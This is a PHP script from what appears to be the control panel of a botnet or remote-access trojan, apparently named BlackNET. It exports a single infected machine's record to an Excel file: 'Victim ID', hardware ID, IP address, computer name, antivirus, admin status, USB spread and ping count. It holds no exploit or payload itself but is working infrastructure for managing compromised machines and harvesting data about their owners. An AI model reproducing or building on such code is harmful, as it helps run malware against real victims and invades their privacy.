<?php
require_once '../session.php';
require_once APP_PATH . 'classes/Clients.php';

use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx;

$clients = new BlackNET\Clients($database, $utils);

$id = $utils->sanitize($_GET['vicid']);
$client = $clients->getClient($id);

$client_data_key = [
    "id" => "ID",
    "vicid" => "Victim ID",
    "hwid" => "HWID",
    "ipaddress" => "IP Address",
    "computername" => "Computer Name",
    "country" => "Country",
    "os" => "OS",
    "cpu" => "CPU",
    "gpu" => "GPU",
    "ramsize" => "RAM Size",
    "insdate" => "Installed Date",
    "update_at" => "Update Date",
    "pings" => "Number of Pings",
    "antivirus" => "Antivirus",
    "version" => "Version",
    "status" => "Status",
    "is_usb" => "Is USB",
    "is_admin" => "User Status"
];

$spreadsheet = new Spreadsheet();

$sheet = $spreadsheet->getActiveSheet();

$sheet->setCellValue('A1', 'Client Key');
$sheet->setCellValue('B1', 'Client Value');


$i = 2;
foreach ($client as $key => $value) {
    $sheet->setCellValue("A" . $i, $client_data_key[$key]);
    $sheet->setCellValue("B" . $i, $value);
    $i++;
}

$writer = new Xlsx($spreadsheet);

$filename = $id . '.xlsx';

header('Content-Type: application/vnd.ms-excel');
header('Content-Disposition: attachment;filename=' . $filename);
header('Cache-Control: max-age=0');

$writer->save('php://output');
